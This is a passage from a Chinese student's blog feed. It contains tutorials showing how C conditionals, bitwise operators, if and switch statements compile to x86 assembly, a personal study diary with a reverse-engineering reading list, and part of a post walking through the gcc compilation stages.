class="line"> int i=1,a=2,c=3,d;</span><br><span class="line">007D4535 mov dword ptr [i],1 </span><br><span class="line">007D453C mov dword ptr [a],2 </span><br><span class="line">007D4543 mov dword ptr [c],3 </span><br><span class="line"> if (i !=MAX)</span><br><span class="line">007D454A cmp dword ptr [i],6 </span><br><span class="line">007D454E je __$EncStackInitStart+6Ah (07D4586h) </span><br><span class="line"> &#123;</span><br><span class="line">  d = (a == c) ? i : a;</span><br><span class="line">007D4550 mov eax,dword ptr [a] </span><br><span class="line">007D4553 cmp eax,dword ptr [c] </span><br><span class="line">007D4556 jne __$EncStackInitStart+47h (07D4563h) </span><br><span class="line">007D4558 mov ecx,dword ptr [i] </span><br><span class="line">007D455B mov dword ptr [ebp-0F4h],ecx </span><br><span class="line">007D4561 jmp __$EncStackInitStart+50h (07D456Ch) </span><br><span class="line">007D4563 mov edx,dword ptr [a] </span><br><span class="line">007D4566 mov dword ptr [ebp-0F4h],edx </span><br><span class="line">007D456C mov eax,dword ptr [ebp-0F4h] </span><br><span class="line">007D4572 mov dword ptr [d],eax </span><br><span class="line"> printf(&quot;%d\n&quot;, d);</span><br><span class="line">007D4575 mov eax,dword ptr [d] </span><br><span class="line">007D4578 push eax </span><br><span class="line">007D4579 push offset string &quot;%d&quot; (07D7BD0h) </span><br><span class="line">007D457E call _printf (07D10D2h) </span><br><span class="line">007D4583 add esp,8 </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的结果是：2</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><ul><li>&lt;&lt; 左移</li><li>&gt;&gt; 右移</li><li>| 位或          有一个1就是1</li><li>&amp;位与         有一个0就是0</li><li>^ 异或         相同则为0，不同则为1</li><li>~ 取反          1变0 ，0 变1</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">1</span>,a,b,c,d,e,f;</span><br><span class="line"> a = i &lt;&lt; <span class="number">1</span>;</span><br><span class="line"> b = i &gt;&gt; <span class="number">1</span>;</span><br><span class="line"> c = i | <span class="number">1</span>;</span><br><span class="line"> d = i &amp; <span class="number">1</span>;</span><br><span class="line"> e = i ^ <span class="number">1</span>;</span><br><span class="line"> f = ~i;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,a);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, b);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, c);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, d);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, e);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, f);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int i=1,a,b,c,d,e,f;</span><br><span class="line">00414535 mov dword ptr [i],1 </span><br><span class="line"> a = i &lt;&lt; 1;</span><br><span class="line">0041453C mov eax,dword ptr [i] </span><br><span class="line">0041453F shl eax,1 </span><br><span class="line">00414541 mov dword ptr [a],eax </span><br><span class="line"> b = i &gt;&gt; 1;</span><br><span class="line">00414544 mov eax,dword ptr [i] </span><br><span class="line">00414547 sar eax,1</span><br><span class="line">00414549 mov dword ptr [b],eax </span><br><span class="line"> c = i | 1;</span><br><span class="line">0041454C mov eax,dword ptr [i] </span><br><span class="line">0041454F or eax,1 </span><br><span class="line">00414552 mov dword ptr [c],eax </span><br><span class="line"> d = i &amp; 1;</span><br><span class="line">00414555 mov eax,dword ptr [i] </span><br><span class="line">00414558 and eax,1 </span><br><span class="line">0041455B mov dword ptr [d],eax </span><br><span class="line"> e = i ^ 1;</span><br><span class="line">0041455E mov eax,dword ptr [i] </span><br><span class="line">00414561 xor eax,1 </span><br><span class="line">00414564 mov dword ptr [e],eax </span><br><span class="line"> f = ~i;</span><br><span class="line">00414567 mov eax,dword ptr [i] </span><br><span class="line">0041456A not eax </span><br><span class="line">0041456C mov dword ptr [f],eax</span><br></pre></td></tr></table></figure><p>输出的结果是：</p><p>2<br>0<br>1<br>1<br>0<br>fffffffe</p><h1 id="4-分支语句"><a href="#4-分支语句" class="headerlink" title="4.分支语句"></a>4.分支语句</h1><p>也就是要判断</p><p>if else switch ..</p><h2 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> a;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;number: &quot;</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"> <span class="keyword">if</span>(a==<span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;you are wrong!&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> int a;</span><br><span class="line"> printf(&quot;number: &quot;);</span><br><span class="line">0012186F push offset string &quot;%d&quot; (0127BD0h) </span><br><span class="line">00121874 call _printf (01210D2h) </span><br><span class="line">00121879 add esp,4 </span><br><span class="line"> scanf_s(&quot;%d&quot;, &amp;a);</span><br><span class="line">0012187C lea eax,[a] </span><br><span class="line">0012187F push eax </span><br><span class="line">00121880 push offset string &quot;%d&quot; (0127B30h) </span><br><span class="line">00121885 call _scanf_s (01213C0h) </span><br><span class="line">0012188A add esp,8 </span><br><span class="line"> if (a == 0)</span><br><span class="line">0012188D cmp dword ptr [a],0 </span><br><span class="line">00121891 jne _main+52h (01218A2h)</span><br><span class="line"> &#123;</span><br><span class="line"> printf(&quot;you are wrong!&quot;);</span><br><span class="line">00121893 push offset string &quot;you are wrong!&quot; (0127BDCh) </span><br><span class="line">00121898 call _printf (01210D2h) </span><br><span class="line">0012189D add esp,4 </span><br><span class="line"> &#125;</span><br><span class="line">001218A0 jmp _main+5Fh (01218AFh) </span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> printf(&quot;yes&quot;);</span><br><span class="line">001218A2 push offset string &quot;yes&quot; (0127BECh) </span><br><span class="line">001218A7 call _printf (01210D2h) </span><br><span class="line">001218AC add esp,4 </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jne 不等则跳转</p><h2 id="SWITCH"><a href="#SWITCH" class="headerlink" title="SWITCH"></a>SWITCH</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> a;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;input integer number: &quot;</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"> <span class="keyword">switch</span>(a)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">printf</span>(<span class="string">&quot;Monday\n&quot;</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">printf</span>(<span class="string">&quot;Tuesday\n&quot;</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">printf</span>(<span class="string">&quot;Wednesday\n&quot;</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">printf</span>(<span class="string">&quot;Thursday\n&quot;</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">printf</span>(<span class="string">&quot;Friday\n&quot;</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">printf</span>(<span class="string">&quot;Saturday\n&quot;</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">7</span>:<span class="built_in">printf</span>(<span class="string">&quot;Sunday\n&quot;</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">default</span>:<span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">int a;</span><br><span class="line"> printf(&quot;input integer number: &quot;);</span><br><span class="line">00D5524F push offset string &quot;input integer number: &quot; (0D57CD0h)</span><br><span class="line">00D55254 call _printf (0D510D2h) </span><br><span class="line">00D55259 add esp,4 </span><br><span class="line"> scanf_s(&quot;%d&quot;, &amp;a);</span><br><span class="line">00D5525C lea eax,[a] </span><br><span class="line">00D5525F push eax </span><br><span class="line">00D55260 push offset string &quot;%d&quot; (0D57B30h) </span><br><span class="line">00D55265 call _scanf_s (0D513C0h) </span><br><span class="line">00D5526A add esp,8 </span><br><span class="line"> switch (a)</span><br><span class="line">00D5526D mov eax,dword ptr [a] </span><br><span class="line">00D55270 mov dword ptr [ebp-0D4h],eax </span><br><span class="line">00D55276 mov ecx,dword ptr [ebp-0D4h] </span><br><span class="line">00D5527C sub ecx,1 </span><br><span class="line">00D5527F mov dword ptr [ebp-0D4h],ecx </span><br><span class="line">00D55285 cmp dword ptr [ebp-0D4h],6 </span><br><span class="line">00D5528C ja $LN10+0Fh (0D55304h) </span><br><span class="line">00D5528E mov edx,dword ptr [ebp-0D4h] </span><br><span class="line">00D55294 jmp dword ptr [edx*4+0D5535Ch] </span><br><span class="line"> &#123;</span><br><span class="line"> case 1:printf(&quot;Monday\n&quot;);</span><br><span class="line">00D5529B push offset string &quot;Monday\n&quot; (0D57BDCh) </span><br><span class="line">00D552A0 call _printf (0D510D2h) </span><br><span class="line">00D552A5 add esp,4 </span><br><span class="line"> break;</span><br><span class="line">00D552A8 jmp $LN10+1Ch (0D55311h) </span><br><span class="line"> case 2:printf(&quot;Tuesday\n&quot;);</span><br><span class="line">00D552AA push offset string &quot;%d&quot; (0D57BD0h) </span><br><span class="line">00D552AF call _printf (0D510D2h) </span><br><span class="line">00D552B4 add esp,4 </span><br><span class="line"> break;</span><br><span class="line">00D552B7 jmp $LN10+1Ch (0D55311h) </span><br><span class="line"> case 3:printf(&quot;Wednesday\n&quot;);</span><br><span class="line">00D552B9 push offset string &quot;Wednesday\n&quot; (0D57BE4h) </span><br><span class="line">00D552BE call _printf (0D510D2h) </span><br><span class="line">00D552C3 add esp,4 </span><br><span class="line"> break;</span><br><span class="line">00D552C6 jmp $LN10+1Ch (0D55311h) </span><br><span class="line"> case 4:printf(&quot;Thursday\n&quot;);</span><br><span class="line">00D552C8 push offset string &quot;Thursday\n&quot; (0D57CE8h) </span><br><span class="line">00D552CD call _printf (0D510D2h) </span><br><span class="line">00D552D2 add esp,4 </span><br><span class="line"> break;</span><br><span class="line">00D552D5 jmp $LN10+1Ch (0D55311h) </span><br><span class="line"> case 5:printf(&quot;Friday\n&quot;);</span><br><span class="line">00D552D7 push offset string &quot;Friday\n&quot; (0D57CF4h) </span><br><span class="line">00D552DC call _printf (0D510D2h) </span><br><span class="line">00D552E1 add esp,4 </span><br><span class="line"> break;</span><br><span class="line">00D552E4 jmp $LN10+1Ch (0D55311h) </span><br><span class="line"> case 6:printf(&quot;Saturday\n&quot;);</span><br><span class="line">00D552E6 push offset string &quot;Saturday\n&quot; (0D57E20h) </span><br><span class="line">00D552EB call _printf (0D510D2h) </span><br><span class="line">00D552F0 add esp,4 </span><br><span class="line"> break;</span><br><span class="line">00D552F3 jmp $LN10+1Ch (0D55311h) </span><br><span class="line"> case 7:printf(&quot;Sunday\n&quot;);</span><br><span class="line">00D552F5 push offset string &quot;Sunday\n&quot; (0D57E2Ch) </span><br><span class="line">00D552FA call _printf (0D510D2h) </span><br><span class="line">00D552FF add esp,4 </span><br><span class="line"> break;</span><br><span class="line">00D55302 jmp $LN10+1Ch (0D55311h) </span><br><span class="line"> default:printf(&quot;error\n&quot;);</span><br><span class="line">00D55304 push offset string &quot;error\n&quot; (0D57E34h) </span><br><span class="line">00D55309 call _printf (0D510D2h) </span><br><span class="line">00D5530E add esp,4 </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p><p>lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址直接赋给目的操作数</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>路途很遥远，一步一脚印</title>
      <link href="/2023/05/06/%E6%80%BB%E7%BB%93/"/>
      <url>/2023/05/06/%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-5-30"><a href="#2023-5-30" class="headerlink" title="2023-5-30"></a>2023-5-30</h1><p>咋说呢。。最近蛮迷茫的，感觉缺少的东西太多了，又有点心急。</p><p>定一个最近的短期计划吧</p><ul><li>中午回到寝室–一篇二进制安全加上写笔记【1个小时绰绰有余了】<ul><li>这个时间主要是用于了解和二进制其中的用法或者有什么东西</li><li>在以后的有时间的时候会专门来写某个工具的使用，工具的使用在以后题目中也会慢慢上手，想通过一篇文章或者一个视频就学会的，实在是太不科学了有点抽象。</li></ul></li><li>晚上<ul><li>争取有时间学学C语言</li><li>还有数据结构和算法【每天至少一篇吧–可以是题目的积累也可以是一个新知识的累计】这个是长期要坚持的</li><li>在有时间就进行复现或者写一个CTF的题目。</li></ul></li></ul><p>最后，工具，有别人集成好了的，就直接用，不用花过多的时间去下载安装工具</p><h1 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023-5-28"></a>2023-5-28</h1><p>发现了自己的很多不足，首先数数据结构不了解，算法知识不太懂，python脚本编写困难</p><p>发现了不足就要去学，这个二进制安全，每天也会写，以后可能会出一点关于计算机组成原理，和数据结构还有算法的知识。</p><p>以后有机会就要多参加参加CTF比赛，（希望我以后每周都能参加，如果没有比赛就刷刷题目。）比赛重在参与，主要是赛后的复现。</p><h1 id="2023-5-21"><a href="#2023-5-21" class="headerlink" title="2023-5-21"></a>2023-5-21</h1><p>这周也有在认真。和好几个男孩子过的520，emmm，下一次希望有一个女朋友【哈哈哈哈】。</p><p>然后呢，逆向已经在慢慢入门了，5月的A&amp;D协会的比赛，侥幸拿到了第一。肯定了我以后学Re的思路。</p><p>慢慢的，就要开始写题咯</p><hr><h1 id="2023-5-14"><a href="#2023-5-14" class="headerlink" title="2023-5-14"></a>2023-5-14</h1><p>这周也没有放弃，也在认真的更新自己的二进制安全的文章。</p><p>加油加油！！<br>今天安装插件。蛮奇怪的，，，，最后装了一个集成版本的…..<br>希望以后能多出CTF题目吧…..<br>还有C 语言的 学习呢…</p><p>一段话：</p><p>可以回头看，但不能回头走！</p><hr><h1 id="2023-5-6"><a href="#2023-5-6" class="headerlink" title="2023-5-6"></a>2023-5-6</h1><p>最近稍微接触一下逆向吧。这个路还蛮遥远的…</p><p>看了一篇文章，稍微记录一下未来日子所需要学的东西</p><p>文章：<a href="https://www.52pojie.cn/thread-1324083-1-1.html">https://www.52pojie.cn/thread-1324083-1-1.html</a></p><p>1.计算机组成原理–<strong>《计算机组成原理》白中英</strong></p><p>2.8086汇编–<strong>《汇编语言（第四版）》王爽</strong></p><p>3.WIN32汇编–<strong>《windows环境下32位汇编语言程序设计》罗云彬</strong></p><p>4.找一本64位的书–<strong>《x86_x64体系探索及编程》</strong></p><p>5.扩展：深入汇编，<strong>《汇编语言编程艺术》《intel汇编语言程序设计》《IBM PC汇编语言程序设计》</strong></p><p>6.C语言–<strong>《C Primer Plus》《C程序设计语言》</strong>入门之作品</p><p>7.深入学编程–<strong>《C陷阱于缺陷》《C专家汇编》《程序员的自我修养》</strong></p><p>8.C++ – <strong>《C++ Primer Plus》</strong></p><p>9.算法于数据结构–<strong>《数据结构（C语言版）》严薇《算法图解》《算法导论》《数据结构与算法分析：C语言描述》</strong></p><p>10.加密和解密– 《<strong>加密与解密</strong>》看雪</p><p>11.逆向知识点–《<strong>C++反汇编与逆向分析技术揭秘</strong>》《<strong>REVERSING：逆向工程揭密</strong>》《<strong>逆向工程核心原理</strong>》</p><p>12.API基础–《<strong>Windows程序设计</strong>》</p><p>13.VC++ –《<strong>VC++深入详解</strong>》，高级语言有目的性的学习</p><p>14.windows系统原理 – 《<strong>深入理解计算机系统</strong>》，《<strong>WINDOWS.核心编程</strong>》，《<strong>IDA Pro权威指南</strong>》</p><p>15.WIN PE  《<strong>windows pe权威指南</strong>》</p><p>16.Windows驱动  《<strong>Windows内核安全与驱动开发</strong>》，《<strong>Windows驱动开发技术详解</strong>》</p><hr><p>哈哈哈哈！任重而道远啊~</p><p>我在学到这个win32的时候，实属有点枯燥无力。所以最近去研究研究了一下二进制安全–这个内容是更着网上的教程一步一步走的。怎么说呢，我如果按照上面的顺序学下来，哈哈哈可能有点脑壳痛。所以呢，这个就按照着这个路线的大概的循序下去。中间插入小插曲，比如【二进制安全的学习】…想学的东西太多啦，要学的东西也很多，时间总是过得如此的快，今天又到了晚上11：36了。</p><p>学安全嘛，各个方向都懂一点，有一项很专精，就会很厉害。经过我对这个渗透和逆向的了解。我确实都喜欢，哈哈哈哈。反正日子还多嘞，现在才19岁，还没到20岁【我还年轻，未来都是我的】哈哈哈~~~</p><p>送我自己一段话吧：<br>我的快乐别人不懂，别人的快乐我不必懂~</p><p>希望我能在这条路上越行越远~</p><hr><p>也许这个魔改的日子要往后调整了，待我暑假吧~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言基础讲解（5）</title>
      <link href="/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-5-C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-5-C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-环境的搭建"><a href="#1-环境的搭建" class="headerlink" title="1.环境的搭建"></a>1.环境的搭建</h1><p>#pragma warning(disable:4996)</p><p>这个环境，就懒得说了，我用的是VS 2022</p><p>然后再linux下是之前那个Ubuntu，gcc版本是5.4.0</p><h1 id="2-用编译器反编译"><a href="#2-用编译器反编译" class="headerlink" title="2.用编译器反编译"></a>2.用编译器反编译</h1><h2 id="windows下"><a href="#windows下" class="headerlink" title="windows下"></a>windows下</h2><p>简单的写一个c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置断点，单步调试，就可以看到一步一步的内容。</p><p>按下f11【要注意不是在黑窗口里面按】或者点vs2022上面的一步一步调试。</p><p>在设置了断点后可以反编译</p><p>调试-&gt;窗口-&gt;反汇编【ctrl+alt+d】</p><p>ok 懂的都懂</p><h2 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">printf(&quot;hello world!&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先生成这个文件哈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -o hello -i 保存路径</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506212836966.png" alt="image-20230506212836966"></p><p>C文件编译都要分为4步：预处理，编译，汇编，连接</p><p><strong>预处理</strong></p><p>在预处理中，展开#开始的内容，比如：#if、#ifdef、#if ndef、 #else 、 #elif 、 # endif、#define、#include、#line、 #error、#pragma。其实就是把除了函数（包括main）以外的东西都展开成指定的形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br><span class="line">cat hello.i</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506213243648.png" alt="image-20230506213243648"></p><hr><p><strong>编译</strong></p><p>就是把预处理的文件进行一系列语法分析及优化后形成相应的汇编文件</p><p>这个汇编的代码看似像又不像的，是因为：这个是一种ATT格式</p><p>但是我之间所用的都是 Intel 汇编格式啦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506213510970.png" alt="image-20230506213510970" style="zoom:50%;" /><p><strong>汇编</strong></p><p>汇编就是把生成的汇编指令逐条翻译成机器可以识别的机器码，这一步会产生和平台相关性，决定了在哪种平台下运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>这里用cat直接打开有点奇怪，但是能看到头部是ELF</p><p>这种二进制代码就copy出来再win7虚拟机中用010打开啦或者用强大的EverEdit打开【需要选中hex模式】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506214143652.png" alt="image-20230506214143652"></p><p><strong>链接</strong></p><p>这是最后一步啦，将生成的目标文件和其所依赖的库进行链接，生成一个可执行的可执行文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure><h1 id="3-变量"><a href="#3-变量" class="headerlink" title="3.变量"></a>3.变量</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>1.命名，这个就不再这里赘述了</p><p>2.数据类型</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506222505883.png" alt="image-20230506222505883" style="zoom:50%;" /><p>再windows下的 win32 x64 还有linux下 i686 x86_4下所存储的大小再某些上面是不同的</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506222920503.png" alt="image-20230506222920503" style="zoom:50%;" /><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>1.数字：10进制就是直接表示，八进制需要0开头，十六进制需要0x开头</p><p>2.字符：字符常量书写：’x’。本质上是ascii码</p><p>3.转移字符</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506223121064.png" alt="image-20230506223121064"></p><p>4.用#define预处理定义常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define identifier value</span><br><span class="line">#define PI 3.14</span><br></pre></td></tr></table></figure><p>5.用const关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const type variable = value</span><br><span class="line">const int var = 5</span><br></pre></td></tr></table></figure><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>变量定义：用于变量分配存储空间，可以指定初始值。程序中，变量有且只有一个定义</li><li>变量声明：用于程序表明变量的类型和名字</li><li>定义也是声明</li></ul><p>extern 声明 不是定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">extern int i; //声明，不是定义</span><br><span class="line">int i; //声明也是定义，没初始化</span><br><span class="line">extern double pi = 3.14; //定义 </span><br><span 